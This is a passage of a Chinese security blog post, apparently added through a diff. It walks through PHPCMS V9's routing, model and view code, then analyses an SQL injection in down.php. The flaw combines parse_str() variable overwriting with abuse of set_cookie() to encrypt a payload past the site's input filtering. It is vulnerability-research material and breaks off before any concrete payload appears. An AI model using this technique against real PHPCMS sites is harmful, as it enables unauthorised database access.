+<p>到这里基本就掌握了PHPCMS V9的程序流程，如我们通过<code>http://phpcms.test:8888/index.php?m=admin&amp;c=badword&amp;a=add</code>就可以访问<code>phpcms/modules/admin/badword.php</code> 中 <code>badword类</code> 的 <code>add()</code> 方法</p>
+<h2 id="phpcms-首页执行流程"><a href="#phpcms-首页执行流程" class="headerlink" title="phpcms 首页执行流程"></a>phpcms 首页执行流程</h2><p>上面知道 phpcms 所有的程序最终将由 app 对象来执行并呈现，下面通过 phpcms 首页的执行流程为例做分析</p>
+<p>在路由文件中 <code>caches/configs/route.php</code> 设定了默认的m，c，a为content，index，init，即网站的首页，根据默认 mca 值找到对应控制器的代码</p>
+<h3 id="1、控制器对象实例化"><a href="#1、控制器对象实例化" class="headerlink" title="1、控制器对象实例化"></a>1、控制器对象实例化</h3><blockquote>
+<p>phpcms/modules/content/index.php</p>
+</blockquote>
+<ul>
+<li><strong>index控制器</strong>实例化时构造方法获主要加载了content_model数据模型，初始化了 <strong>index 控制器</strong>的基本属性</li>
+<li>数据模型对应文件为 phpcms/model/content_model.class.php，等下以这个为例分析 phpcms 的数据模型是怎么工作的</li>
+<li><strong>事件</strong>对应的方法为 init()，似乎没有做什么事情，最后加载模板文件从而输出视图</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">index</span> </span>&#123;<br>  	<span class="hljs-keyword">private</span> <span class="hljs-variable">$db</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-keyword">$this</span>-&gt;db = pc_base::load_model(<span class="hljs-string">&#x27;content_model&#x27;</span>);<br>      <span class="hljs-keyword">$this</span>-&gt;_userid = param::get_cookie(<span class="hljs-string">&#x27;_userid&#x27;</span>);<br>      <span class="hljs-keyword">$this</span>-&gt;_username = param::get_cookie(<span class="hljs-string">&#x27;_username&#x27;</span>);<br>      <span class="hljs-keyword">$this</span>-&gt;_groupid = param::get_cookie(<span class="hljs-string">&#x27;_groupid&#x27;</span>);<br>    &#125;<br>  	<span class="hljs-comment">// 首页</span><br>  	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;siteid&#x27;</span>])) &#123;<br>        	<span class="hljs-variable">$siteid</span> = intval(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;siteid&#x27;</span>]);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        	<span class="hljs-variable">$siteid</span> = <span class="hljs-number">1</span>;<br>      &#125;<br>      <span class="hljs-variable">$siteid</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;siteid&#x27;</span>] = max(<span class="hljs-variable">$siteid</span>,<span class="hljs-number">1</span>);<br>      define(<span class="hljs-string">&#x27;SITEID&#x27;</span>, <span class="hljs-variable">$siteid</span>);<br>      <span class="hljs-variable">$_userid</span> = <span class="hljs-keyword">$this</span>-&gt;_userid;<br>      <span class="hljs-variable">$_username</span> = <span class="hljs-keyword">$this</span>-&gt;_username;<br>      <span class="hljs-variable">$_groupid</span> = <span class="hljs-keyword">$this</span>-&gt;_groupid;<br>      <span class="hljs-comment">//SEO</span><br>      ……<br>      <span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;content&#x27;</span>,<span class="hljs-string">&#x27;index&#x27;</span>,<span class="hljs-variable">$default_style</span>);<br>		&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="2、数据模型"><a href="#2、数据模型" class="headerlink" title="2、数据模型"></a>2、数据模型</h3><p>在看PHPCMS首页的数据模型前，我们需要知道PHPCMS的<strong>数据模型基类</strong>是怎么写的</p>
+<h4 id="数据模型基类"><a href="#数据模型基类" class="headerlink" title="数据模型基类"></a>数据模型基类</h4><blockquote>
+<p>phpcms/libs/classes/model.class.php</p>
+</blockquote>
+<ul>
+<li><code>db_factory::get_instance()</code> 把 model 类的配置读取到 db_factory 类中的配置</li>
+<li><code>db_factory::get_database()</code> db_factory 类将获取到数据库连接，最终返回到 model 类的 <code>$db</code> 属性中</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 加载且不实例化phpcms/libs/classes/db_factory.class.php，该文件定义了一个数据库工厂db_factory类，具有连接数据库的一些函数</span><br>pc_base::load_sys_class(<span class="hljs-string">&#x27;db_factory&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">model</span> </span>&#123;<br>  	<span class="hljs-comment">//数据库配置</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$db_config</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-comment">//数据库连接</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$db</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-comment">//调用数据库的配置项</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$db_setting</span> = <span class="hljs-string">&#x27;default&#x27;</span>;<br>    <span class="hljs-comment">//数据表名</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$table_name</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-comment">//表前缀</span><br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$db_tablepre</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;db_config[<span class="hljs-keyword">$this</span>-&gt;db_setting])) &#123;<br>        <span class="hljs-keyword">$this</span>-&gt;db_setting = <span class="hljs-string">&#x27;default&#x27;</span>;<br>      &#125;<br>      <span class="hljs-keyword">$this</span>-&gt;table_name = <span class="hljs-keyword">$this</span>-&gt;db_config[<span class="hljs-keyword">$this</span>-&gt;db_setting][<span class="hljs-string">&#x27;tablepre&#x27;</span>].<span class="hljs-keyword">$this</span>-&gt;table_name;<br>      <span class="hljs-keyword">$this</span>-&gt;db_tablepre = <span class="hljs-keyword">$this</span>-&gt;db_config[<span class="hljs-keyword">$this</span>-&gt;db_setting][<span class="hljs-string">&#x27;tablepre&#x27;</span>];<br>      <span class="hljs-keyword">$this</span>-&gt;db = db_factory::get_instance(<span class="hljs-keyword">$this</span>-&gt;db_config)-&gt;get_database(<span class="hljs-keyword">$this</span>-&gt;db_setting);<br>    &#125;<br>……<br></code></pre></td></tr></table></figure>
+
+<h4 id="数据库的具体连接"><a href="#数据库的具体连接" class="headerlink" title="数据库的具体连接"></a>数据库的具体连接</h4><p>上面说到 <code>db_factory::get_database()</code> 可以获取到数据库链接，看看具体代码</p>
+<blockquote>
+<p>phpcms/libs/classes/db_factory.class.phps</p>
+</blockquote>
+<ul>
+<li><code>get_database()</code> 调用 <code>connect()</code></li>
+<li><code>connect()</code> 根据配置文件加载并实例化最终的<strong>数据库实现类</strong>，我这里是mysqli，将会加载phpcms/libs/classes/db_mysqli.class.php ，并实例化 db_mysqli 类</li>
+<li>$object 为 db_mysqli 类实例化对象，调用 open() 方法，并返回该对象</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">db_factory</span> </span>&#123;<br>  	<span class="hljs-comment">// 获取数据库操作实例</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_database</span>(<span class="hljs-params"><span class="hljs-variable">$db_name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;db_list[<span class="hljs-variable">$db_name</span>]) || !is_object(<span class="hljs-keyword">$this</span>-&gt;db_list[<span class="hljs-variable">$db_name</span>])) &#123;<br>          	<span class="hljs-keyword">$this</span>-&gt;db_list[<span class="hljs-variable">$db_name</span>] = <span class="hljs-keyword">$this</span>-&gt;connect(<span class="hljs-variable">$db_name</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;db_list[<span class="hljs-variable">$db_name</span>];<br>    &#125;<br>  	<span class="hljs-comment">// 加载数据库驱动</span><br>   	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"><span class="hljs-variable">$db_name</span></span>) </span>&#123;<br>        <span class="hljs-variable">$object</span> = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">switch</span>(<span class="hljs-keyword">$this</span>-&gt;db_config[<span class="hljs-variable">$db_name</span>][<span class="hljs-string">&#x27;type&#x27;</span>]) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;mysqli&#x27;</span> :<br>            <span class="hljs-variable">$object</span> = pc_base::load_sys_class(<span class="hljs-string">&#x27;db_mysqli&#x27;</span>);<br>            ……<br>        &#125;<br>        <span class="hljs-variable">$object</span>-&gt;open(<span class="hljs-keyword">$this</span>-&gt;db_config[<span class="hljs-variable">$db_name</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$object</span>;<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>phpcms/libs/classes/db_mysqli.class.php</p>
+</blockquote>
+<ul>
+<li>在 db_mysqli 中通过 open() 方法最终调用 connect() 实现数据库连接</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">db_mysqli</span> </span>&#123;<br>  	<span class="hljs-keyword">public</span> <span class="hljs-variable">$link</span> = <span class="hljs-literal">null</span>;<br>  	<span class="hljs-comment">// 打开数据库链接</span><br>  	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$config</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;config = <span class="hljs-variable">$config</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;autoconnect&#x27;</span>] == <span class="hljs-number">1</span>) &#123;<br>          <span class="hljs-keyword">$this</span>-&gt;connect();<br>        &#125;<br>		&#125;<br>  	<span class="hljs-comment">// 真正开启数据库连接，数据库连接放在 db_mysqli::$link 中</span><br>  	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;link = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;hostname&#x27;</span>], <span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;database&#x27;</span>], <span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;port&#x27;</span>]?intval(<span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;port&#x27;</span>]):<span class="hljs-number">3306</span>);<br>        ……<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;link;<br>		&#125;<br></code></pre></td></tr></table></figure>
+
+<p>到这数据库就真正连接了，并且数据库连接对象最终会返回到数据模型基类 <code>model::$db</code> 中，<code>model::$db-&gt;$link</code> 则是数据库连接。所以继承数据模型基类只需要带好数据库配置就会自动获取数据库连接对象。</p>
+<p>注意 model 类封装了一些基础sql操作，如 getone() 方法用于从数据库中获取一条数据，直接通过 <code>model::getone()</code>即可调用，而 <code>model::getone()</code> 其实是调用 <code>model::$db-&gt;getone()</code> 来实现，所以最终实现sql操作的是 db_mysqli 这种<strong>数据库实现类</strong></p>
+<h4 id="首页的数据模型"><a href="#首页的数据模型" class="headerlink" title="首页的数据模型"></a>首页的数据模型</h4><blockquote>
+<p>phpcms/model/content_model.class.php</p>
+</blockquote>
+<ul>
+<li><code>content_model</code> 继承数据模型基类 <code>model</code>，初始化时首先读取了 <code>caches/configs/database.php</code> 的配置信息，包括数据账号密码</li>
+<li>然后执行了父类 模型基类 <code>model</code> 构造方法，从而实现数据连接，那么 <code>content_model::$db</code> 将是数据库连接对象</li>
+<li>后面还加载了 phpcms/modules/content/classes/url.class.php ，并实例化了其中的url类放在 <code>$this-&gt;url</code> 中</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 加载且不实例化数据模型基类 phpcms/libs/classes/model.class.php</span><br>pc_base::load_sys_class(<span class="hljs-string">&#x27;model&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">content_model</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">model</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$table_name</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$category</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>      	<span class="hljs-comment">// 读取数据库配置文件</span><br>        <span class="hljs-keyword">$this</span>-&gt;db_config = pc_base::load_config(<span class="hljs-string">&#x27;database&#x27;</span>);<br>        <span class="hljs-keyword">$this</span>-&gt;db_setting = <span class="hljs-string">&#x27;default&#x27;</span>;<br>        <span class="hljs-built_in">parent</span>::__construct();<br>      	<span class="hljs-comment">// 加载并实例化 url.class.php</span><br>        <span class="hljs-keyword">$this</span>-&gt;url = pc_base::load_app_class(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-string">&#x27;content&#x27;</span>);<br>        <span class="hljs-keyword">$this</span>-&gt;siteid = get_siteid();<br>    &#125;<br>  	……<br></code></pre></td></tr></table></figure>
+
+<h3 id="3、视图"><a href="#3、视图" class="headerlink" title="3、视图"></a>3、视图</h3><p>在控制器事件中，最后一行代码 <code>include template(&#39;content&#39;,&#39;index&#39;,$default_style);</code> 是用于输出视图的，这里也简单关注一下phpcms是怎么输出视图的</p>
+<blockquote>
+<p>phpcms/libs/functions/global.func.php</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">template</span>(<span class="hljs-params"><span class="hljs-variable">$module</span> = <span class="hljs-string">&#x27;content&#x27;</span>, <span class="hljs-variable">$template</span> = <span class="hljs-string">&#x27;index&#x27;</span>, <span class="hljs-variable">$style</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br>  	<span class="hljs-variable">$template_cache</span> = pc_base::load_sys_class(<span class="hljs-string">&#x27;template_cache&#x27;</span>);<br>  	<span class="hljs-comment">// 控制器对应的php模板文件</span><br>		<span class="hljs-variable">$compiledtplfile</span> = PHPCMS_PATH.<span class="hljs-string">&#x27;caches&#x27;</span>.DIRECTORY_SEPARATOR.<span class="hljs-string">&#x27;caches_template&#x27;</span>.DIRECTORY_SEPARATOR.<span class="hljs-variable">$style</span>.DIRECTORY_SEPARATOR.<span class="hljs-variable">$module</span>.DIRECTORY_SEPARATOR.<span class="hljs-variable">$template</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;<br>  	<span class="hljs-keyword">if</span>(……) <span class="hljs-comment">// 如果php模板文件不存在，可以使用html模板编译成php模板，具体方法不细看 </span><br>      	<span class="hljs-variable">$template_cache</span>-&gt;template_compile(<span class="hljs-variable">$module</span>, <span class="hljs-variable">$template</span>, <span class="hljs-variable">$style</span>);<br>  	<span class="hljs-keyword">return</span> <span class="hljs-variable">$compiledtplfile</span>;<br></code></pre></td></tr></table></figure>
+
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>app对象根据m,c,a参数找到并加载 <code>phpcms/modules/content/index.php</code> 文件后，会实例化其中的控制器对象，控制器中会加载数据模型和视图。phpcms已具有了明显的MVC模式，能明显感受到的是 PHPCMS V9 在框架上相比于其他CMS成熟了不少</p>
+<h1 id="0x02-漏洞审计"><a href="#0x02-漏洞审计" class="headerlink" title="0x02 漏洞审计"></a>0x02 漏洞审计</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>上面已经知道 phpcms 会使用 <code>addslases()</code> 来全局过滤GPC数据，可以很好的防御在sql语句中使用引号包裹的变量</p>
+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><blockquote>
+<p>phpcms/modules/content/down.php</p>
+</blockquote>
+<p>通过<strong>Seay代码审计系统</strong>扫描结果是显示该文件只存在一个变量覆盖的问题，仔细一看，通过变量覆盖还可以造成SQL注入，下面仔细研究一下</p>
+<ul>
+<li><code>$id</code> 将通过 <code>db-&gt;get_one()</code> 执行sql查询</li>
+<li>可以注意到当 <code>isset($i)==true</code> 时，<code>$id=intval($i)</code>，这里 <code>$id</code> 会被强制转换成数字类型</li>
+<li>但巧在这里存在一个 <code>parse_str($a_k)</code>，如果 <code>$a_k</code> 可控，便可以通过覆盖变量控制 <code>$i</code> 和 <code>$id</code> 的值，绕过 <code>intval()</code> 转换</li>
+<li><code>$a_k</code> 来自 <code>$_GET[&#39;a_k&#39;]</code>，可控，但我们知道全局会对GPC参数addslashs()过滤。这里 <code>$a_k</code> 传入 <code>parse_str()</code> 前，还会经过 <code>sys_auth($operation=&#39;DECODE&#39;)</code> 方法解密，巧了，这里解密操作证明 <code>$a_k</code>  本来是加密字符串，加密字符串岂不是又可能会绕过全局 addslashs() 过滤，那我们现在只需要构造加密的 payload 就可以利用这个漏洞了</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">down</span> </span>&#123;<br>	<span class="hljs-keyword">private</span> <span class="hljs-variable">$db</span>;<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>			<span class="hljs-keyword">$this</span>-&gt;db = pc_base::load_model(<span class="hljs-string">&#x27;content_model&#x27;</span>);<br>	&#125;<br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-variable">$a_k</span> = trim(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a_k&#x27;</span>]);<br>      <span class="hljs-variable">$a_k</span> = sys_auth(<span class="hljs-variable">$a_k</span>, <span class="hljs-string">&#x27;DECODE&#x27;</span>, pc_base::load_config(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;auth_key&#x27;</span>));<br>      <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$i</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$f</span>);<br>      parse_str(<span class="hljs-variable">$a_k</span>);<br>      <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$i</span>)) <span class="hljs-variable">$i</span> = <span class="hljs-variable">$id</span> = intval(<span class="hljs-variable">$i</span>);<br>      <span class="hljs-variable">$rs</span> = <span class="hljs-keyword">$this</span>-&gt;db-&gt;get_one(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span>=&gt;<span class="hljs-variable">$id</span>));<br>      ……<br>  &#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="加密payload"><a href="#加密payload" class="headerlink" title="加密payload"></a>加密payload</h3><blockquote>
+<p>phpcms/libs/functions/global.func.php</p>
+</blockquote>
+<p><code>sys_auth($string,$operation)</code> 是一个加密解密函数，加密算法比较复杂就不研究了，需要知道的是当 <code>$operation==&#39;DECODE&#39;</code>，传入的值会被解密，<code>$operation==&#39;ENCODE&#39;</code> 时，传入的值会被加密。现在我们需要将我们的 payload 加密，被上面的代码解密后才能利用漏洞</p>
+<p>在看 <code>sys_auth()</code> 代码时发现在加密解密过程中会使用一个密钥，密钥来自配置文件中 <code>auth_key</code> 的值，每个PHPCMS程序的 <code>auth_key</code> 值不同，我们想控制加密内容一是获取程序的<code>auth_key</code>值，然后复制程序的加密算法，加密我们的payload；或者我们在程序中寻找提供 <code>sys_auth()</code> 加密的功能，借用程序的功能加密我们的payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sys_auth</span>(<span class="hljs-params"><span class="hljs-variable">$string</span>, <span class="hljs-variable">$operation</span> = <span class="hljs-string">&#x27;ENCODE&#x27;</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$expiry</span> = <span class="hljs-number">0</span></span>) </span>&#123;<br>    <span class="hljs-variable">$ckey_length</span> = <span class="hljs-number">4</span>;<br>    <span class="hljs-variable">$key</span> = md5(<span class="hljs-variable">$key</span> != <span class="hljs-string">&#x27;&#x27;</span> ? <span class="hljs-variable">$key</span> : pc_base::load_config(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;auth_key&#x27;</span>));<br>    ……<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;DECODE&#x27;</span>) &#123;<br>      <span class="hljs-keyword">if</span>((substr(<span class="hljs-variable">$result</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>) == <span class="hljs-number">0</span> || substr(<span class="hljs-variable">$result</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>) - time() &gt; <span class="hljs-number">0</span>) &amp;&amp; substr(<span class="hljs-variable">$result</span>, <span class="hljs-number">10</span>, <span class="hljs-number">16</span>) == substr(md5(substr(<span class="hljs-variable">$result</span>, <span class="hljs-number">26</span>).<span class="hljs-variable">$keyb</span>), <span class="hljs-number">0</span>, <span class="hljs-number">16</span>)) &#123;<br>        <span class="hljs-keyword">return</span> substr(<span class="hljs-variable">$result</span>, <span class="hljs-number">26</span>);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>;<br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable">$keyc</span>.rtrim(strtr(base64_encode(<span class="hljs-variable">$result</span>), <span class="hljs-string">&#x27;+/&#x27;</span>, <span class="hljs-string">&#x27;-_&#x27;</span>), <span class="hljs-string">&#x27;=&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>寻找程序中使用 <code>sys_auth()</code> 加密的地方又是一个复杂的过程，具体参考大佬 <a target="_blank" rel="noopener" href="https://mochazz.github.io/">https://mochazz.github.io/</a> 的相关博客，下面我只简单记录下过程</p>
+<p>在 param.class.php 中找到 sys_auth() 可控，代码如下 </p>
+<blockquote>
+<p>phpcms/libs/classes/param.class.php</p>
+</blockquote>
+<ul>
+<li>set_cookie() 传入参数 $var, $value</li>
+<li>$value 的值会通过 sys_auth 加密，并以cookie的形式发送客户端，利用这个功能点可以很好的加密payload</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">param</span> </span>&#123;<br>  	<span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_cookie</span>(<span class="hljs-params"><span class="hljs-variable">$var</span>, <span class="hljs-variable">$value</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$time</span> = <span class="hljs-number">0</span></span>) </span>&#123;<br>        <span class="hljs-variable">$time</span> = <span class="hljs-variable">$time</span> &gt; <span class="hljs-number">0</span> ? <span class="hljs-variable">$time</span> : (<span class="hljs-variable">$value</span> == <span class="hljs-string">&#x27;&#x27;</span> ? SYS_TIME - <span class="hljs-number">3600</span> : <span class="hljs-number">0</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>] == <span class="hljs-string">&#x27;443&#x27;</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$var</span> = pc_base::load_config(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;cookie_pre&#x27;</span>).<span class="hljs-variable">$var</span>;<br>        <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-variable">$var</span>] = <span class="hljs-variable">$value</span>;<br>        <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$value</span>)) &#123;<br>          <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$value</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$v</span>) &#123;<br>            setcookie(<span class="hljs-variable">$var</span>.<span class="hljs-string">&#x27;[&#x27;</span>.<span class="hljs-variable">$k</span>.<span class="hljs-string">&#x27;]&#x27;</span>, sys_auth(<span class="hljs-variable">$v</span>, <span class="hljs-string">&#x27;ENCODE&#x27;</span>), <span class="hljs-variable">$time</span>, pc_base::load_config(<span class="hljs-string">&#x27;system&#x27;</span>,<span 